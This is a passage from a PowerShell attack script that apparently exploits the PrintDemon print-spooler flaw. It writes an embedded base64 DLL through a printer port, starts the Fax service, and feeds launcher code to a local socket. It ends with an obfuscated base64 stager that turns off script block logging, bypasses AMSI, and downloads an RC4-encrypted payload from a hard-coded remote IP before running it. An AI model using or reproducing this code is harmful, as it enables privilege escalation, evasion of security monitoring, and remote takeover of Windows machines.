sZQAAwQJSZXZlcnRUb1NlbGYAAEFEVkFQSTMyLmRsbAAACAltZW1zZXQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyot8tmSsAAM1dINJm1P//oJ1o2ZAf0xGZcQDAT2jIdvF9NrWsy88RlcoAgF9IoZIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQAAAuEAAAyDYAADAQAAB1EQAAzDYAAHgRAACPEQAA1DYAAJgRAACvEQAA3DYAALgRAADOEgAA5DYAANQSAADZFwAA/DYAAOAXAAAoGQAAJDcAADAZAABFGgAAODcAAEwaAABqHAAAUDcAAHAcAAA4HQAAeDcAAEAdAABQHwAAkDcAAFgfAABcIAAAsDcAAGQgAAAFIQAAxDcAABQhAAAxIQAA4DcAADQhAACPIQAA2DcAALAhAACyIQAA6DcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEBAQEBAQEBAQEBAQEBAQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAGAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAgAAADAAAIAAAAAAAAAAAAAAAAAAAAEACQQAAEgAAABgcAAAkQAAAAAAAAAAAAAAAAAAAAAAAAA8P3htbCB2ZXJzaW9uPScxLjAnIGVuY29kaW5nPSdVVEYtOCcgc3RhbmRhbG9uZT0neWVzJz8+DQo8YXNzZW1ibHkgeG1sbnM9J3VybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxJyBtYW5pZmVzdFZlcnNpb249JzEuMCc+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAYAAAAAKIIohCiGKJIpGCkaKQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

[IntPtr] $unmanaged = ([system.runtime.interopservices.marshal]::AllocHGlobal($pe.Length));
[system.runtime.interopservices.marshal]::Copy($PE, 0, $unmanaged, $PE.Length);
[Printer.RawPrinterHelper]::SendBytesToPrinter("PrintDemon", $unmanaged, $PE.Length);
sc.exe start Fax

$FTPServer = "localhost"
$FTPPort = "9299"

$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
$tcpStream = $tcpConnection.GetStream()
$reader = New-Object System.IO.StreamReader($tcpStream)
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.AutoFlush = $true
$commands = @( "test `r",$LauncherCode,"`r" );

while ($tcpConnection.Connected)
{
    while ($tcpStream.DataAvailable)
    {
        $reader.ReadLine()
    }

    if ($tcpConnection.Connected)
    {
        ForEach ($str in $commands){
            Start-Sleep -s 5
            $command = $str
            if ($command -eq "escape")
            {
                break
            }
            $writer.WriteLine($command) | Out-Null
        }
    }
}

$reader.Close()
$writer.Close()
$tcpConnection.Close()
}

Invoke-PrintDemon 'SQBmACgAJABQAFMAVgBFAHIAcwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAFIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBFACAAMwApAHsAJABCADcARgA0AD0AWwBSAEUAZgBdAC4AQQBTAHMARQBtAEIAbABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBlAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAGIANwBGADQAKQB7ACQAYgAzADkAOQA9ACQAYgA3AGYANAAuAEcAZQB0AFYAQQBsAHUAZQAoACQAbgBVAEwAbAApADsASQBGACgAJABiADMAOQA5AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAYgAzADkAOQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABiADMAOQA5AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBMAGwAZQBjAHQASQBPAG4AcwAuAEcARQBOAGUAcgBJAGMALgBEAGkAQwBUAEkATwBOAGEAUgB5AFsAcwB0AFIASQBuAEcALABTAHkAUwB0AEUAbQAuAE8AQgBKAGUAQwB0AF0AXQA6ADoATgBFAFcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGIAMwA5ADkAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAHAAdABCAEwAbwBjAGsAXQAuACIARwBFAHQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBMAFUAZQAoACQAbgBVAEwAbAAsACgATgBFAFcALQBPAGIASgBFAEMAdAAgAEMAbwBMAEwAZQBjAFQAaQBPAE4AcwAuAEcARQBuAEUAUgBJAGMALgBIAGEAcwBoAFMARQBUAFsAUwBUAHIAaQBuAEcAXQApACkAfQAkAFIARQBmAD0AWwBSAEUAZgBdAC4AQQBzAFMARQBtAEIAbABZAC4ARwBlAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAEYALgBHAGUAdABGAGkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBsAFUARQAoACQAbgBVAGwAbAAsACQAdABSAFUARQApADsAfQA7AFsAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFMAZQBSAFYAaQBjAGUAUABPAGkAbgB0AE0AYQBuAEEARwBFAFIAXQA6ADoARQB4AFAAZQBDAHQAMQAwADAAQwBvAE4AdABJAE4AVQBlAD0AMAA7ACQARQBCAEQAZAA9AE4ARQB3AC0ATwBCAGoARQBjAHQAIABTAFkAUwBUAGUATQAuAE4AZQB0AC4AVwBFAGIAQwBMAGkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAGQASQBOAEcAXQA6ADoAVQBuAGkAQwBPAEQARQAuAEcAZQBUAFMAdABSAEkAbgBnACgAWwBDAE8AbgB2AGUAcgBUAF0AOgA6AEYAcgBPAG0AQgBBAFMARQA2ADQAUwB0AHIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAawBBAE0AZwBBAHUAQQBEAEUAQQBOAGcAQQA0AEEAQwA0AEEATQBRAEEAegBBAEQAawBBAEwAZwBBADIAQQBEAEkAQQBPAGcAQQA0AEEARABBAEEATwBBAEEAdwBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGUAQgBkAEQALgBIAEUAYQBEAGUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABlAEIARABEAC4AUAByAE8AWABZAD0AWwBTAHkAUwBUAGUATQAuAE4AZQBUAC4AVwBFAGIAUgBFAHEAVQBlAHMAdABdADoAOgBEAGUAZgBBAHUAbAB0AFcARQBCAFAAcgBvAHgAWQA7ACQAZQBiAEQARAAuAFAAcgBvAHgAeQAuAEMAcgBlAGQARQBuAFQASQBBAEwAcwAgAD0AIABbAFMAeQBTAFQARQBtAC4ATgBFAHQALgBDAFIAZQBkAGUATgBUAEkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAGUARgBhAHUAbABUAE4AZQBUAHcAbwBSAGsAQwBSAEUAZABlAG4AVABJAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGUAYgBkAGQALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAFQAZQBtAC4AVABFAHgAVAAuAEUAbgBjAG8AZABJAE4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAHkAdABFAFMAKAAnACoAOwA1ADQAWwBpADkAPQBqAE4AfQBFAFUAcwBtAHwAUwBoACkANgB3AHYAegBEAGsAPgBIACwATQBiADAAOgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGUAYgBEAGQALgBIAEUAYQBkAGUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGQASQByAFUAVABSAHMAPQBQADAARgBhAGYAaQBaAHcAUAB3AFMAUwBDAC8AQQBtACsAcAB1AFYAVABCAFEAZQBtAGUAWQA9ACIAKQA7ACQAZABhAFQAQQA9ACQARQBCAEQARAAuAEQATwBXAE4ATABPAGEAZABEAEEAdABhACgAJABzAGUAUgArACQAdAApADsAJABpAFYAPQAkAEQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAEQAYQBUAEEAWwA0AC4ALgAkAGQAYQB0AEEALgBMAGUATgBnAHQASABdADsALQBqAG8AaQBuAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=='
